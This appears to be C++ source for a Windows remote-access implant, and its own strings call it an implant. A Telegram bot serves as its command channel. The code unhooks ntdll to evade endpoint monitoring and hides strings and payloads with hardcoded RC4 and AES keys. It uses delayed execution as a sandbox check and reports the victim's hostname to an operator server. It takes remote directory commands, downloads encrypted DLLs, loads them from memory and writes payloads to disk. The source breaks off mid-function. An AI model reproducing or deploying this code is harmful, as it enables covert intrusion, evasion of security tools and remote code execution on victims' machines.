#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <WinInet.h>
#include <iostream>
#include "json.hpp"
#include <vector>
#include <memory>
#include <string>
#include <stdexcept>
#include <iomanip>
#include <sstream>

#include <tchar.h> 
#include <stdio.h>
#include <strsafe.h>

#include "ARC4.h"
#include "aes.hpp"
#include "base64.h"

#include <atlstr.h>

#include "moduleloader.h"

#include <map>

//
#include <algorithm> 
#include <cctype>
#include <locale>
//

#define BUFSIZE 1000

#pragma comment(lib, "User32.lib")

#pragma comment (lib, "Wininet.lib")

typedef INT(*DOSOMETHING)();

using namespace std;

template <typename T>
T process_arg(T value) noexcept
{
    return value;
}

template <typename T>
T const* process_arg(std::basic_string<T> const& value) noexcept
{
    return value.c_str();
}

template<typename ... Args>
std::string string_format(const std::string& format, Args const & ... args)
{
    const auto fmt = format.c_str();
    const size_t size = std::snprintf(nullptr, 0, fmt, process_arg(args) ...) + 1;
    auto buf = std::make_unique<char[]>(size);
    std::snprintf(buf.get(), size, fmt, process_arg(args) ...);
    auto res = std::string(buf.get(), buf.get() + size - 1);
    return res;
}


std::vector<std::string> allowed;

//
typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
VirtualProtect_t VirtualProtect_p = NULL;

std::string TOKENBOT = "";
std::string CHATID = "";
std::string HELPBOT = "";

struct Info* globalInfo;

typedef HANDLE(WINAPI* CreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* MapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapViewOfFile_t)(LPCVOID);



struct FileStruct {
    unsigned char* wtf;
    size_t size;
};

class FileSystem {
public:
    FileSystem() {
        root = new Directory("");
    }
    vector<string> ls(string path) {
        vector<string> tokens = tokenize(path);
        Node* cur = root;
        for (auto& token : tokens) {
            cur = cur->next[token];
        }
        return cur->ls();
    }

    void mkdir(string path) {
        vector<string> tokens = tokenize(path);
        Node* cur = root;
        for (auto& token : tokens) {
            if (cur->next.count(token) == 0) {
                cur->next[token] = new Directory(token);
            }
            cur = cur->next[token];
        }
    }

    void addContentToFile(string filePath, string content) {
        vector<string> tokens = tokenize(filePath);
        Node* cur = root;
        for (auto& token : tokens) {
            if (cur->next.count(token) == 0) {
                cur->next[token] = new File(token);
            }
            cur = cur->next[token];
        }

        ((File*)cur)->append(content);
    }

    string readContentFromFile(string filePath) {
        vector<string> tokens = tokenize(filePath);
        Node* cur = root;
        for (auto& token : tokens) {
            cur = cur->next[token];
        }

        return ((File*)cur)->read();
    }

private:
    class Node {
    public:
        Node(const string& name) {
            this->name = name;
        }

        string getName() {
            return name;
        }

        virtual bool isDirectory() = 0;
        virtual vector<string> ls() = 0;

        map<string, Node*> next;
    protected:
        string name;
    };

    class File : public Node {
    public:
        File(const string& name) : Node(name) {}

        bool isDirectory() override {
            return false;
        }

        vector<string> ls() override {
            return { name };
        }

        void append(const string& str) {
            data.append(str);
        }

        string read() {
            return data;
        }
    private:
        string data;
    };

    class Directory : public Node {
    public:
        Directory(const string& name) : Node(name) {}

        bool isDirectory() override {
            return true;
        }

        vector<string> ls() override {
            vector<string> ret;
            for (auto it = next.begin(); it != next.end(); ++it) {
                ret.push_back(it->first);
            }

            return ret;
        }
    private:

    };

    vector<string> tokenize(const string& path) {
        vector<string> ret;
        int pos = 1;
        string token;
        while (pos < path.length()) {
            if (path[pos] == '/') {
                ret.push_back(token);
                token.clear();
            }
            else {
                token.push_back(path[pos]);
            }
            ++pos;
        }

        if (token.length() > 0) {
            ret.push_back(token);
        }

        return ret;
    }

    Node* root;
};


//
static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
    /*
        UnhookNtdll() finds .text segment of fresh loaded copy of ntdll.dll and copies over the hooked one
    */
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)pish->Name, ".text")) {
            // prepare ntdll.dll memory region for write permissions.
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!oldprotect) {
                // RWX failed!
                return -1;
            }
            // copy original .text section into ntdll memory
            memcpy((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize);

            // restore original protection settings of ntdll
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!oldprotect) {
                // it failed
                return -1;
            }
            // all is good, time to go home
            return 0;
        }
    }
    // .text section not found?
    return -1;
}



int lastUpdateId = -1;

std::string get_json_string()
{
    std::string result;
    std::string url;
    //cout << url << endl;
    if (lastUpdateId == -1) {
        url = string_format("/bot%s/getUpdates?offset=-1", TOKENBOT);
    }
    else {
        url = string_format("/bot%s/getUpdates?offset=%d", TOKENBOT, lastUpdateId);
    }
    const char* headers = "Content-Type: application/json\r\nHost: PUT HOST\r\nAccept-Encoding: gzip,deflate,br\r\nCache-Control: no-cache\r\n";
    
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConnection = InternetConnectA(hInternet, "PUT HOST", 443, " ", " ", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);

    HINTERNET hRequest = HttpOpenRequestA(hConnection, "GET",url.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 1);
    if (HttpSendRequestA(hRequest, headers, strlen(headers), 0, 0)) {
        DWORD blocksize = 4096;
        DWORD received = 0;
        std::string block(blocksize, 0);
        while (InternetReadFile(hRequest, &block[0], blocksize, &received)
            && received)
        {
            block.resize(received);
            result += block;
        }
    }


    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnection);
    InternetCloseHandle(hInternet);
    //std::cout << "Result: " << result << endl;
    return result;
}




struct Update {
    long long int chat_id;
    std::string text;
    int update_id;
    std::string file_id;
    std::string filepath;
    std::string caption;
};

struct Info {
    //std::string ProcessName;
    std::string Username;
    std::string Hostname;
    int PID;
};

char * INFOSTR = NULL;

struct Message {
    std::string text;
    long long int chat_id;
};

static inline void ltrim(std::string& s) {
    s.erase(s.begin(), std::find_if(s.begin(), s.end(), [](unsigned char ch) {
        return !std::isspace(ch);
        }));
}

// trim from end (in place)
static inline void rtrim(std::string& s) {
    s.erase(std::find_if(s.rbegin(), s.rend(), [](unsigned char ch) {
        return !std::isspace(ch);
        }).base(), s.end());
}

// trim from both ends (in place)
static inline void trim(std::string& s) {
    ltrim(s);
    rtrim(s);
}

std::string decryptStr(std::string str) {

    std::vector<uint8_t> ciphertext, recovered;
    std::string decoded;
    base64 b64 = base64();

    decoded = b64.base64_decode(str);


    std::string someKey = "HJDSJHOIjdOUIASHD217831298198798&78687237684";
    
    ARC4 rc4;
    rc4.setKey((unsigned char*)someKey.c_str(), someKey.length());
    char* dec = (char*)malloc(decoded.size());

    rc4.encrypt((char*)decoded.data(), dec, decoded.size());
 
    std::string retStr;
    retStr.append(dec);
    trim(retStr);
 
    return retStr;

}

// trim from start (in place)


std::string encryptStr(std::string str) {
    std::vector<uint8_t> ciphertext;

    std::string plaintext;
    plaintext = str;

    base64 b64 = base64();



    std::string someKey = "HJDSJHOIjdOUIASHD217831298198798&78687237684";
    ARC4 rc4;
    rc4.setKey((unsigned char*)someKey.c_str(), someKey.length());
    char* enc = (char*)malloc(plaintext.size());

    rc4.encrypt((char*)plaintext.data(), enc, plaintext.size());
  
    std::string encoded = b64.base64_encode((const unsigned char*)enc, (plaintext.size()));

    
    std::string decoded = decryptStr(encoded);
 
    
    

    while (str != decoded) {
   
        encoded = encryptStr(str);
        
        decoded = decryptStr(encoded);
       
    }

    return encoded;
}


void sendMessage(struct Update& m) {

  
    std::string result;
    std::string url;

    json::JSON jobj;
    std::string responseStr;
    LPVOID response = NULL;
    std::string jobjStr;

    const char* headers;

    if (m.chat_id == 0) {
        responseStr = string_format("chat_id=%s&text=%s", CHATID, m.text);
        response = (LPVOID)responseStr.c_str();
        headers = "Content-Type: application/x-www-form-urlencoded\r\nHost: PUT HOST\r\nAccept-Encoding: gzip,deflate,br\r\nCache-Control: no-cache\r\n";

    }
    else {
        jobj["chat_id"] = m.chat_id;
        jobj["text"] = m.text;
        jobj["disable_notification"] = true;
        jobjStr = jobj.dump();

        response = (LPVOID)(jobjStr.c_str());
        headers = "Content-Type: application/json\r\nHost: PUT HOST\r\nAccept-Encoding: gzip,deflate,br\r\nCache-Control: no-cache\r\n";

    }

    

    
    url = string_format("/bot%s/sendMessage", TOKENBOT);

    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConnection = InternetConnectA(hInternet, "PUT HOST", 443, " ", " ", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);
    HINTERNET hRequest = HttpOpenRequestA(hConnection, "POST", url.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 1);
    
    if (m.chat_id == 0) {
        if (HttpSendRequestA(hRequest, headers, strlen(headers), response, responseStr.length())) {
            DWORD blocksize = 4096;
            DWORD received = 0;
            std::string block(blocksize, 0);
            while (InternetReadFile(hRequest, &block[0], blocksize, &received)
                && received)
            {
                block.resize(received);
                result += block;
            }
        }
    }
    else {
        if (HttpSendRequestA(hRequest, headers, strlen(headers), response, jobjStr.length())) {
            DWORD blocksize = 4096;
            DWORD received = 0;
            std::string block(blocksize, 0);
            while (InternetReadFile(hRequest, &block[0], blocksize, &received)
                && received)
            {
                block.resize(received);
                result += block;
            }
        }
    }
    
   


    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnection);
    InternetCloseHandle(hInternet);

    
    
}

void sendHelpMessage(struct Update& m) {


    std::string result;
    std::string url;

    json::JSON jobj;
    std::string responseStr;
    LPVOID response = NULL;
    std::string jobjStr;

    const char* headers;

    if (m.chat_id == 0) {
        responseStr = string_format("chat_id=%s&text=%s", CHATID, m.text);
       // std::cout << "Message: " << responseStr << endl;
        response = (LPVOID)responseStr.c_str();
        headers = "Content-Type: application/x-www-form-urlencoded\r\nHost:PUT HOST\r\nAccept-Encoding: gzip,deflate,br\r\nCache-Control: no-cache\r\n";

    }
    else {
        jobj["chat_id"] = m.chat_id;
        jobj["text"] = m.text;
        jobj["disable_notification"] = true;
        jobjStr = jobj.dump();

        //cout << "mensgam pra enviar: " << jobjStr << endl;
        response = (LPVOID)(jobjStr.c_str());
        headers = "Content-Type: application/json\r\nHost: PUT HOST\r\nAccept-Encoding: gzip,deflate,br\r\nCache-Control: no-cache\r\n";

    }




    url = string_format("/bot%s/sendMessage", HELPBOT);


    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConnection = InternetConnectA(hInternet, "PUT HOST", 443, " ", " ", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);
    //HINTERNET hConnection = InternetConnectA(hInternet, "api.telegram.org", 443, " ", " ", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);
    HINTERNET hRequest = HttpOpenRequestA(hConnection, "POST", url.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 1);

    if (m.chat_id == 0) {
        if (HttpSendRequestA(hRequest, headers, strlen(headers), response, responseStr.length())) {
            DWORD blocksize = 4096;
            DWORD received = 0;
            std::string block(blocksize, 0);
            while (InternetReadFile(hRequest, &block[0], blocksize, &received)
                && received)
            {
                block.resize(received);
                result += block;
            }
        }
    }
    else {
        if (HttpSendRequestA(hRequest, headers, strlen(headers), response, jobjStr.length())) {
            DWORD blocksize = 4096;
            DWORD received = 0;
            std::string block(blocksize, 0);
            while (InternetReadFile(hRequest, &block[0], blocksize, &received)
                && received)
            {
                block.resize(received);
                result += block;
            }
        }
    }




    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnection);
    InternetCloseHandle(hInternet);



}

void askHelp() {
    struct Update m;
    m.chat_id = 0;
    m.text = "there is an implant waiting for avaliable token, please fix it";
    sendHelpMessage(m);
}

std::string getFileString(struct Update& m) {


    std::string result;
    std::string url;
    

    url = string_format("/bot%s/getFile?file_id=%s", TOKENBOT, m.file_id);
  
    const char* headers = "Content-Type: application/json\r\nHost: PUT HOST\r\nAccept-Encoding: gzip,deflate,br\r\nCache-Control: no-cache\r\n";
   
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConnection = InternetConnectA(hInternet, "PUT HOST", 443, " ", " ", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);
    HINTERNET hRequest = HttpOpenRequestA(hConnection, "GET", url.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 1);
    if (HttpSendRequestA(hRequest, headers, strlen(headers), 0, 0)) {
        DWORD blocksize = 4096;
        DWORD received = 0;
        std::string block(blocksize, 0);
        while (InternetReadFile(hRequest, &block[0], blocksize, &received)
            && received)
        {
            block.resize(received);
            result += block;
        }
    }


    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnection);
    InternetCloseHandle(hInternet);
    return result;

}

void saveFile(struct FileStruct* fileS, std::string filename) {
    
       

        TCHAR Buffer[BUFSIZE];
        DWORD dwRet;


        dwRet = GetCurrentDirectory(BUFSIZE, Buffer);
         wstring s1(&Buffer[0]);
         string s2(s1.begin(), s1.end());

         s2 = s2 + "\\" + filename;

        CA2W pszWide(s2.c_str());
        HANDLE hFile = CreateFile(
            pszWide,     // Filename
            GENERIC_WRITE,          // Desired access
            FILE_SHARE_READ,        // Share mode
            NULL,                   // Security attributes
            CREATE_NEW,             // Creates a new file, only if it doesn't already exist
            FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
            NULL);                  // Template file handle

        if (hFile == INVALID_HANDLE_VALUE)
        {
            // Failed to open/create file
            return;
        }

        DWORD bytesWritten;
        WriteFile(
            hFile,            // Handle to the file
            fileS->wtf,  // Buffer to write
            fileS->size,   // Buffer size
            &bytesWritten,    // Bytes written
            nullptr);         // Overlapped

         // Close the handle once we don't need it.
        CloseHandle(hFile);

}
struct FileStruct* decrypt(std::string filestring) {

    std::vector<uint8_t> ciphertext, recovered;
    std::string shellcode, decoded;
    base64 b64 = base64();

    shellcode = filestring;


    decoded = b64.base64_decode(shellcode);


    ciphertext.clear();
    std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));

    // AES Decryption Objects
    struct AES_ctx e_ctx;
    uint8_t iv[] = { 0x95,0x50,0x7a,0x62,0xc9,0xcc,0x39,0x40,0xff,0xe3,0xab,0x10,0xa1,0xdf,0x63,0x61 };
    uint8_t key[] = { 0x75,0x70,0x2f,0xfa,0x3c,0x45,0x41,0x1d,0x49,0xfe,0x5d,0x95,0xda,0xd3,0xca,0xf9,0x6e,0x35,0x40,0x87,0xdc,0xb5,0xf9,0xae,0x9d,0x10,0x25,0x10,0x21,0x6d,0x2f,0xbc };
    AES_init_ctx_iv(&e_ctx, key, iv);

    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
    recovered.clear();

    for (int i = 0; i < ciphertext.size(); i++)
    {
        //if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
        //{
        //	continue;
        //}
        //else
        //{
        recovered.push_back(ciphertext[i]);
        //}
    }

    size_t rSize = recovered.size();


    //hollow(recovered);
    unsigned char* wtf = NULL;

    wtf = (unsigned char*)malloc(rSize);

    //std::cout << "Size: " << rSize << std::endl;

    std::copy(recovered.begin(), recovered.end(), wtf);

    struct FileStruct* file = new FileStruct;

    file->size = rSize;
    file->wtf = wtf;

    return file;

}

void runDLL(struct Update &m, struct FileSystem* fs, std::string filestring) {

    std::string file = "/" + filestring;
    vector<string> param_2 = fs->ls("/");
    bool found = false;

    for (auto& i : param_2) {
        if (filestring == i) {
            found = true;
            break;
        }
  
    }
    if (found) {
        string file_content = fs->readContentFromFile(file);


        struct FileStruct* fileS = decrypt(file_content);
        PLOADEDMODULE pModule = LoadModuleFromMemory(fileS->wtf, fileS->size);
        if (NULL != pModule)
        {
            DOSOMETHING DoSomething = (DOSOMETHING)_GetProcAddress(pModule, "DoSomething");
            if (NULL != DoSomething)
            {
                DoSomething();
            }

            //FreeLibraryResources(pModule);
        }

    }else {
        m.text = "file name does not exist";
        sendMessage(m);
    }
    
    


}
    
void saveFileToVFS(std::string filestring, struct Update& m, struct FileSystem* fs) {

   
    
    std::string file = "/"+m.caption;

    fs->addContentToFile(file, filestring);



    m.text = "File saved to virtual file system";
    sendMessage(m);
    

}



void flushToDisk(std::string filename, struct FileSystem* fs) {
    std::string file = "/" + filename;
    string file_content = fs->readContentFromFile(file);

    struct FileStruct* fileS = decrypt(file_content);

    saveFile(fileS, filename);

}

void flushToDiskClean(std::string filename, struct FileSystem* fs) {
    std::string file = "/" + filename;
    string file_content = fs->readContentFromFile(file);

    struct FileStruct* fileS = new FileStruct;

    fileS->wtf = (unsigned char *)file_content.c_str();
    fileS->size = file_content.size();

    saveFile(fileS, filename);

}
void saveFileCurrentDirectory(struct Update& m, struct FileSystem* fs) {


    

    std::string result;
    std::string url;
    //cout << url << endl;

   

    url = string_format("/file/bot%s/%s", TOKENBOT, m.filepath);

    const char* headers = "Content-Type: application/json\r\nHost:PUT HOST\r\n\Accept-Encoding: gzip,deflate,br\r\nCache-Control: no-cache\r\n";
\
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConnection = InternetConnectA(hInternet, "PUT HOST", 443, " ", " ", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);
    //HINTERNET hConnection = InternetConnectA(hInternet, "api.telegram.org", 443, " ", " ", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);

    HINTERNET hRequest = HttpOpenRequestA(hConnection, "GET", url.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 1);
    if (HttpSendRequestA(hRequest, headers, strlen(headers), 0, 0)) {
        DWORD blocksize = 4096;
        DWORD received = 0;
        std::string block(blocksize, 0);
        while (InternetReadFile(hRequest, &block[0], blocksize, &received)
            && received)
        {
            block.resize(received);
            result += block;
        }
    }


    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnection);
    InternetCloseHandle(hInternet);
   
    saveFileToVFS(result, m, fs);

    
}

std::string ReplaceAll(std::string str, const std::string& from, const std::string& to) {
    size_t start_pos = 0;
    while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
        str.replace(start_pos, from.length(), to);
        start_pos += to.length(); // Handles case where 'to' is a substring of 'from'
    }
    return str;
}


vector<struct Update> getStruct(struct FileSystem* fs)
{
    vector<struct Update> update;

    update.clear();
    
    std::string s1 = get_json_string();
    json::JSON ast;
   
    ast = ast.Load(s1);
   
    for (int i = 0; i < ast["result"].size(); i++) {
        struct Update m;

        if (ast["result"][i]["message"].hasKey("caption")) {
            
            m.file_id = ast["result"][i]["message"]["document"]["file_id"].ToString();
            m.caption = ast["result"][i]["message"]["caption"].ToString();

            long long int temp_chatid = ast["result"][i]["message"]["chat"]["id"].ToInt();
         
            std::string fileStr = getFileString(m);
            json::JSON ast2;
            ast2 = ast2.Load(fileStr);
            m.filepath = ast2["result"]["file_path"].ToString();
            m.chat_id = temp_chatid;
            saveFileCurrentDirectory(m, fs);
            
        }
        else if (ast["result"][i]["channel_post"].hasKey("text")) {
            //cout << "ae caraaalho" << endl;
            m.text = ast["result"][i]["channel_post"]["text"].ToString();
            m.chat_id = 0;
        }
        else {
            m.text = ast["result"][i]["message"]["text"].ToString();
            m.chat_id = ast["result"][i]["message"]["chat"]["id"].ToInt();
        }
       

        m.update_id = ast["result"][i]["update_id"].ToInt();
        //get chat_id from message
       
        lastUpdateId = m.update_id;
        update.push_back(m);

    }

 

    //get text from message

    if (update.size() > 0) {
        lastUpdateId++;
    }


    ////cout << update.ok<< endl;
    return update;
}

void zeroUpdates()
{
    
    

    std::string s1 = get_json_string();
    json::JSON ast;
  
    ast = ast.Load(s1);

   
    lastUpdateId = ast["result"][0]["update_id"].ToInt();
  
        lastUpdateId++;
       
}

size_t split(const std::string& txt, std::vector<std::string>& strs, char ch)
{
    size_t pos = txt.find(ch);
    size_t initialPos = 0;
    strs.clear();

    // Decompose statement
    while (pos != std::string::npos) {
        strs.push_back(txt.substr(initialPos, pos - initialPos));
        initialPos = pos + 1;

        pos = txt.find(ch, initialPos);
    }

    // Add the last one
    strs.push_back(txt.substr(initialPos, min(pos, txt.size()) - initialPos + 1));

    return strs.size();
}

void listCurrentDir(struct Update& m) {
    WIN32_FIND_DATA ffd;
    LARGE_INTEGER filesize;
    TCHAR szDir[MAX_PATH];
    size_t length_of_arg;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD dwError = 0;

   
    TCHAR Buffer[BUFSIZE];
    DWORD dwRet;



    dwRet = GetCurrentDirectory(BUFSIZE, Buffer);

 

    StringCchLength(Buffer, MAX_PATH, &length_of_arg);

    if (length_of_arg > (MAX_PATH - 3))
    {
        _tprintf(TEXT("\nDirectory path is too long.\n"));
        return;
    }

   

    StringCchCopy(szDir, MAX_PATH, Buffer);
    StringCchCat(szDir, MAX_PATH, TEXT("\\*"));


    hFind = FindFirstFile(szDir, &ffd);

    if (INVALID_HANDLE_VALUE == hFind)
    {
        //DisplayErrorBox(TEXT("FindFirstFile"));
        return;
    }

    // List all the files in the directory with some info about them.
    std::string lst;
    do
    {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            string s = string_format("  %ws   <DIR>\n", ffd.cFileName);
            lst += s;
            //sendMessage(m);
        }
        else
        {
            filesize.LowPart = ffd.nFileSizeLow;
            filesize.HighPart = ffd.nFileSizeHigh;
            string s = string_format("  %ws   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
            
            lst += s;
            //sendMessage(m);
        }
    } while (FindNextFile(hFind, &ffd) != 0);

    dwError = GetLastError();
    if (dwError != ERROR_NO_MORE_FILES)
    {
        //DisplayErrorBox(TEXT("FindFirstFile"));
    }

    FindClose(hFind);

    //m.text = s2;
    if (lst.length() > 4096) {
        m.text = "too large";
        sendMessage(m);
    }
    else {
        m.text = lst;
        sendMessage(m);
    }
    
}

void changeCurrentDirAndList(struct Update& m, std::string path ) {
    WIN32_FIND_DATA ffd;
    LARGE_INTEGER filesize;
    TCHAR szDir[MAX_PATH];
    size_t length_of_arg;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD dwError = 0;

   
    TCHAR Buffer[BUFSIZE];
    DWORD dwRet;

    

    dwRet = GetCurrentDirectory(BUFSIZE, Buffer);

    
    
    CA2W pszWide(path.c_str());

    SetCurrentDirectory(pszWide);

    dwRet = GetCurrentDirectory(BUFSIZE, Buffer);

    StringCchLength(Buffer, MAX_PATH, &length_of_arg);

    if (length_of_arg > (MAX_PATH - 3))
    {
        _tprintf(TEXT("\nDirectory path is too long.\n"));
        return;
    }

    wstring s1(&Buffer[0]);
    string s2(s1.begin(), s1.end());
    string s = string_format("\nTarget directory is %s\n\n", s2);
    m.text = s;
    sendMessage(m);

}
void listVFS(struct Update& m, struct FileSystem* fs) {

    vector<string> param_2 = fs->ls("/");
    for (auto& i : param_2) {
        m.text = i;
        sendMessage(m);
    }
}

void sayHello(struct Info& infostruct) {
    //cout << "saying hello" << endl;
    struct Update m;
    m.chat_id = 0;
    m.text = "Im alive at " + infostruct.Hostname;
    sendMessage(m);
}

void pingChannel() {
    struct Update m;
    m.chat_id = 0;
    m.text = "I'm alive at " + globalInfo->Hostname;
    sendMessage(m);
}

void parse(struct Update& m, struct FileSystem* fs) {

    std::vector<std::string> cmd;
    split(m.text, cmd, ' ');

    if (cmd[0] == "ls") {
        listCurrentDir(m);
    }

    if (cmd[0] == "cd") {
        std::string cmdStr;
        cmdStr = "C:\\";
        if (cmd.size() > 2) {
            for (int i = 1; i < cmd.size(); i++) {
                if (i == 1) {
                    cmdStr = cmdStr + cmd[i];
                }
                else {
                    cmdStr = cmdStr + " " + cmd[i];
                }
                
            }
            //cmdStr = cmdStr + "\"";
            //std::cout << "dir: " << cmdStr << endl;
            changeCurrentDirAndList(m, cmdStr);
        }

        if (cmd.size() == 2) {
            changeCurrentDirAndList(m, cmd[1]);
        }
    }

    if (cmd[0] == "pwd") {
        TCHAR Buffer[BUFSIZE];
        DWORD dwRet;


        dwRet = GetCurrentDirectory(BUFSIZE, Buffer);

        wstring s1(&Buffer[0]);
        string s2(s1.begin(), s1.end());
        //_tprintf(TEXT("\nTarget directory is %s\n\n"), Buffer);
        string s = string_format("%s", s2);
        //cout << "TARGET: " << s2 << endl;
        m.text = s;
        sendMessage(m);

    }


    if (cmd[0] == "lsv") {
        listVFS(m, fs);
    }

    if (cmd[0] == "flush") {
        flushToDisk(cmd[1], fs);
    }

    if (cmd[0] == "load") {
        runDLL(m,fs, cmd[1]);
    }

    if (cmd[0] == "flush-clean") {
        flushToDiskClean(cmd[1], fs);
    }

    if (cmd[0] == "/ping") {
        pingChannel();
    }

}

int Delay_Exec(int number) {
    ULONGLONG uptimeBeforeSleep = GetTickCount64();
    typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
    PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
    LARGE_INTEGER delay;
    delay.QuadPart = -10000 * number;
    pNtDelayExecution(FALSE, &delay);
    ULONGLONG uptimeAfterSleep = GetTickCount64();
    if ((uptimeAfterSleep - uptimeBeforeSleep) < number) {
        //printf("[!] Delay Execution Failed ! \n");
        return -1;
    }
    else {
        //printf("[+] DONE ! \n");
        return 1;
    }
}

bool start() {

    std::string result;
    std::string url;

    
    url = "/_189129";
    std::string responseStr = encryptStr("live");
    LPVOID response = (LPVOID)(responseStr.c_str());
    const char* headers = "Content-Type: text/plain\r\nHost: PUT HOST\r\nAccept-Encoding: gzip,deflate,br\r\nCache-Control: no-cache\r\n";
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConnection = InternetConnectA(hInternet, "PUT HOST", 443, " ", " ", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);
    HINTERNET hRequest = HttpOpenRequestA(hConnection, "POST", url.c_str(), NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 1);
    if (HttpSendRequestA(hRequest, headers, strlen(headers), response, responseStr.length())) {
        DWORD blocksize = 4096;
        DWORD received = 0;
        std::string block(blocksize, 0);
        while (InternetReadFile(hRequest, &block[0], blocksize, &received)
            && received)
        {
            block.resize(received);
            result += block;
        }
    }


    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnection);
    InternetCloseHandle(hInternet);

    
    std::string bot_str = decryptStr(result);
    
    while (bot_str.length() > 46 ) {
        bot_str = decryptStr(result);
        
    }
    if (bot_str.find("avaliable") == std::string::npos && bot_str.length() == 46) {
        TOKENBOT = bot_str;
    }
    else {
        askHelp();
        return false;
    }

    TOKENBOT = bot_str;
    return true;
}


#include <iostream>
#include <sstream>
using namespace std;


void getAllowed() {

    std::string result;
    std::string url;

  
    url = "/_189129";
    std::string responseStr = encryptStr("allowed");
    LPVOID response = (LPVOID)(responseStr.c_str());
    const char* headers = "Content-Type: text/plain\r\nHost: PUT HOST\r\nAccept-Encoding: gzip,deflate,br\r\nCache-Control: no-cache\r\n";
    //const char* headers = "Content-Type: application/json\r\nAccept-Encoding: gzip,deflate,br\r\nCache-Control: no-cache\r\n";
    //LPVOID myMessage = (LPVOID)postData.c_str();
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET hConnection = InternetConnectA(hInternet, "PUT HOST", 443, " ", " ", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);
    //HINTERNET hConnection = InternetConnectA(hInternet, "api.telegram.org", 443, " ", " ", INTERNET_SERVICE_HTTP, INTERNET_FLAG_SECURE, 1);
